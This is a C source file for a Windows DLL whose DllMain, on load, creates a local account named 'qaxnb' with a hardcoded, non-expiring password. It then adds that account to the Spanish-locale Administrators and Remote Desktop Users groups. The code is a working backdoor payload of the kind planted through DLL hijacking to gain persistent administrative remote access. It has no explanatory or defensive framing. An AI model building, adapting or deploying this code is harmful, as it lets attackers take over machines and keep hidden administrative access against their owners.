#include <windows.h>
#include <lm.h>
#include <stdio.h>

#pragma comment(lib, "netapi32.lib")

void LogStatus(const wchar_t* action, NET_API_STATUS status) {
    if (status == NERR_Success) {
        wprintf(L"[+] %s: OK\n", action);
    } else {
        wprintf(L"[-] %s failed: Error %d\n", action, status);
    }
}

DWORD AddUserAndGroups() {
    USER_INFO_1 userInfo;
    DWORD dwLevel = 1;
    DWORD dwError = 0;

    userInfo.usri1_name = L"qaxnb";
    userInfo.usri1_password = L"Aa@123456";
    userInfo.usri1_priv = USER_PRIV_USER;
    userInfo.usri1_home_dir = NULL;
    userInfo.usri1_comment = NULL;
    userInfo.usri1_flags = UF_SCRIPT | UF_DONT_EXPIRE_PASSWD;
    userInfo.usri1_script_path = NULL;

    NET_API_STATUS nStatus = NetUserAdd(NULL, dwLevel, (LPBYTE)&userInfo, &dwError);
    LogStatus(L"Create user", nStatus);

    LOCALGROUP_MEMBERS_INFO_3 account;
    account.lgrmi3_domainandname = L"qaxnb";

    nStatus = NetLocalGroupAddMembers(NULL, L"Administradores", 3, (LPBYTE)&account, 1);
    LogStatus(L"Add to Administradores", nStatus);

    nStatus = NetLocalGroupAddMembers(NULL, L"Usuarios de escritorio remoto", 3, (LPBYTE)&account, 1);
    LogStatus(L"Add to Usuarios de escritorio remoto", nStatus);

    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        AddUserAndGroups();
    }
    return TRUE;
}
